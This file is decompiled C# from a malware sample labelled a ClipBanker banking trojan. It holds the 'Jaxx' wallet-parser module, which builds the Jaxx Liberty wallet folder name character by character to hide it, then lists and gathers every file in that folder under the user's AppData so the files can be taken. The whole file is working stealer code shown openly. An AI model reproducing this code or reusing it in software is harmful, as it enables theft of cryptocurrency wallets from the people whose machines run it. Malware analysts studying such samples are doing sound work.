// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Applications.Wallets.Jaxx
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Models.Core;
using FtpClient.Models.Info;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace FtpClient.Data.Applications.Wallets
{
  public class Jaxx : IWalletParser
  {
    public string Name => new string(new char[16]
    {
      'c',
      'o',
      'm',
      '.',
      'l',
      'i',
      'b',
      'e',
      'r',
      't',
      'y',
      '.',
      'j',
      'a',
      'x',
      'x'
    });

    public string RootDirectory => Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";

    public string TargetPath => this.RootDirectory + this.Name;

    public IEnumerable<string> GetFiles() => Directory.Exists(this.TargetPath) ? Directory.EnumerateFiles(this.TargetPath, "*", SearchOption.AllDirectories) : Enumerable.Empty<string>();

    public IEnumerable<InfoClass9> GetWallets()
    {
      List<InfoClass9> wallets = new List<InfoClass9>();
      IEnumerable<string> files = this.GetFiles();
      if (files.Any<string>())
      {
        foreach (string str in files)
        {
          try
          {
            string fullName = new FileInfo(str).Directory.FullName;
            InfoClass9 infoClass9 = new InfoClass9(str)
            {
              Object3 = new string(new char[4]
              {
                'J',
                'a',
                'x',
                'x'
              }),
              Object4 = fullName.Replace(this.RootDirectory + this.Name, new string(new char[4]
              {
                'J',
                'a',
                'x',
                'x'
              }))
            };
            wallets.Add(infoClass9);
          }
          catch
          {
          }
        }
      }
      return (IEnumerable<InfoClass9>) wallets;
    }
  }
}
